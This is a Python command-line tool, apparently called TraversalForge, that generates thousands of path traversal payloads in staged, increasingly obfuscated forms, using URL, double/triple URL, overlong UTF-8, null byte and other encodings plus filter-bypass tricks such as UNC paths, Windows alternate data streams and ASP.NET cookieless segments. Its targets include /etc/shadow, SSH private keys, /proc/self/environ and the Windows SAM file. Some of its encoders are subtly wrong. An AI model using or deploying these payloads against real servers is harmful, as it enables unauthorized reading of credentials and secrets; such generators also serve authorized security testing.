import urllib.parse
import random
import base64
import argparse

class PathTraversalGenerator:
    def __init__(self, max_depth=10, platform='both', encodings=None, max_payloads=1000, stages=5):
        self.max_depth = max_depth
        self.platform = platform.lower()
        self.encodings = encodings if encodings else ['none', 'url', 'unicode', 'double_url', 'null_byte', 
                                                      'utf16', 'hex', 'base64', 'html_entities', 'utf7', 
                                                      'mixed_case', 'triple_url', 'overlong_utf8']
        self.max_payloads = max_payloads
        self.stages = stages
        self.payloads = set()  # Store unique payload strings

    def _get_directory_separators(self):
        if self.platform == 'linux':
            return ["/"]
        elif self.platform == 'windows':
            return ["\\"]
        else:
            return ["/", "\\"]

    def _encode(self, payload, encoding):
        if encoding == 'url':
            return urllib.parse.quote(payload)
        elif encoding == 'unicode':
            return payload.replace('.', '\u002e').replace('/', '\u002f').replace('\\', '\u005c')
        elif encoding == 'double_url':
            return urllib.parse.quote(urllib.parse.quote(payload))
        elif encoding == 'triple_url':
            return urllib.parse.quote(urllib.parse.quote(urllib.parse.quote(payload)))
        elif encoding == 'null_byte':
            return payload + '%00'
        elif encoding == 'utf16':
            return ''.join(['%u00' + format(ord(c), 'x') for c in payload])
        elif encoding == 'hex':
            return ''.join(['%' + format(ord(c), 'x') for c in payload])
        elif encoding == 'base64':
            return base64.b64encode(payload.encode()).decode()
        elif encoding == 'html_entities':
            return ''.join(['&#' + str(ord(c)) + ';' for c in payload])
        elif encoding == 'utf7':
            return ''.join(['+' + base64.b64encode(c.encode()).decode() for c in payload])
        elif encoding == 'overlong_utf8':
            return ''.join([urllib.parse.quote(('\xc0' + c).encode()) for c in payload])
        elif encoding == 'mixed_case':
            return ''.join([c.upper() if random.choice([True, False]) else c.lower() for c in payload])
        return payload

    def _generate_base_payloads(self, stage=1):
        # Increase payload obfuscation as stages progress
        if stage == 1:
            return ['..', '../', '..\\', '..%2f', '..%5c']
        elif stage == 2:
            return ['..', '../', '..\\', '....//', '....\\\\', '..%2f', '..%5c', '..\\/', '../..//']
        elif stage == 3:
            return ['..', '../', '..\\', '%2e%2e/', '%2e%2e\\', '..%00', '%00/', '..%c0%af', '..%e0%80%af']
        elif stage == 4:
            return [
                '..', '../', '..\\', '..%2f', '..%5c', 
                '....//', '....\\\\', '../fake/../', '..\\fake\\..\\', '....//fake//....//',
                'url:file:///', '(S(x))/../', '::$DATA'
            ]
        elif stage == 5:
            return [
                '..', '../', '..\\', '..%2f', '..%5c', '....//', '....\\\\', '..%00', '%00/', '..%c0%af',
                '\\\\localhost\\c$\\', 'url:file:///', '//////', '(S(x))/../', '::$DATA'
            ]

    def _generate_anti_sanitization_payloads(self, base_payload, stage=1):
        anti_sanitization_patterns = [
            lambda payload: payload.replace('/', '%2f').replace('\\', '%5c'),  # Encoded slash sequences
            lambda payload: payload.replace('..', '.../'),  # Mixed traversal sequences
            lambda payload: payload.replace('..', '../fake_dir/../'),  # Fake directories
        ]
        
        # Add more obfuscation for advanced stages
        if stage >= 2:
            anti_sanitization_patterns += [
                lambda payload: payload[::-1],  # Reverse traversal
                lambda payload: payload + '::$DATA',  # Windows ADS
            ]
        if stage >= 3:
            anti_sanitization_patterns += [
                lambda payload: f"\\\\localhost\\c$\\{payload.strip('/')}",  # UNC Bypass for Windows
                lambda payload: 'url:file:///' + payload,  # URL scheme bypass
                lambda payload: '//////' + payload,  # Bypass NGINX/ALB traversal
                lambda payload: '(S(x))/' + payload,  # ASP.NET Cookieless bypass
            ]

        return [pattern(base_payload) for pattern in anti_sanitization_patterns]

    def _generate_path_target_payloads(self):
        targets = {
            'linux': [
                '/etc/passwd', '/etc/shadow', '/proc/self/environ', '/home/$USER/.ssh/id_rsa',
                '/var/log/apache/access.log', '/proc/[0-9]*/fd/[0-9]*'
            ],
            'windows': [
                'c:\\windows\\system32\\license.rtf', 'c:\\boot.ini', 'c:\\inetpub\\wwwroot\\web.config',
                'c:\\windows\\repair\\sam', 'c:\\windows\\system32\\eula.txt'
            ]
        }
        return targets.get(self.platform, targets['linux'] + targets['windows'])

    def generate_payloads(self):
        path_targets = self._generate_path_target_payloads()
        
        for stage in range(1, self.stages + 1):
            print(f"Generating stage {stage} payloads...")
            base_payloads = self._generate_base_payloads(stage)

            while len(self.payloads) < self.max_payloads:
                depth = random.randint(1, self.max_depth)
                base_payload = random.choice(base_payloads)
                target_file = random.choice(path_targets)
                payload = (base_payload * depth) + target_file
                
                encoding = random.choice(self.encodings)
                encoded_payload = self._encode(payload, encoding)

                # Add to the set if unique
                if encoded_payload not in self.payloads:
                    self.payloads.add(encoded_payload)
                    print(f"Generated payload: {encoded_payload}")

                # Anti-sanitization payloads for advanced stages
                anti_sanitized_payloads = self._generate_anti_sanitization_payloads(base_payload, stage)
                for anti_payload in anti_sanitized_payloads:
                    encoded_anti_payload = self._encode(anti_payload + target_file, encoding)
                    self.payloads.add(encoded_anti_payload)

                # Stop if max payloads are reached
                if len(self.payloads) >= self.max_payloads:
                    break
        
        return list(self.payloads)

    def save_to_file(self, filename='payloads.txt'):
        """
        Save the generated payloads to a file.
        """
        with open(filename, 'w') as f:
            for payload in self.payloads:
                f.write(f"{payload}\n")
        print(f"Saved {len(self.payloads)} unique payloads to {filename}")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description='TraversalForge: A Comprehensive Path Traversal Payload Generator')
    parser.add_argument('--max-depth', type=int, default=5, help='Maximum traversal depth (default: 5)')
    parser.add_argument('--platform', choices=['linux', 'windows', 'both'], default='both', help='Target platform (default: both)')
    parser.add_argument('--encodings', nargs='*', default=['none', 'url', 'double_url', 'null_byte', 'utf16', 'hex', 
                                                          'base64', 'html_entities', 'utf7', 'mixed_case', 'triple_url', 'overlong_utf8'], 
                        help='List of encodings to apply (default: all)')
    parser.add_argument('--max-payloads', type=int, default=1000, help='Maximum number of unique payloads to generate (default: 1000)')
    parser.add_argument('--stages', type=int, default=5, help='Number of complexity stages (default: 5)')
    parser.add_argument('--output', type=str, default='payloads.txt', help='Output file for payloads (default: payloads.txt)')

    args = parser.parse_args()

    # Generate payloads based on user options
    generator = PathTraversalGenerator(max_depth=args.max_depth, platform=args.platform, 
                                       encodings=args.encodings, max_payloads=args.max_payloads, stages=args.stages)
    payloads = generator.generate_payloads()
    
    # Save generated payloads to specified file
    generator.save_to_file(args.output)
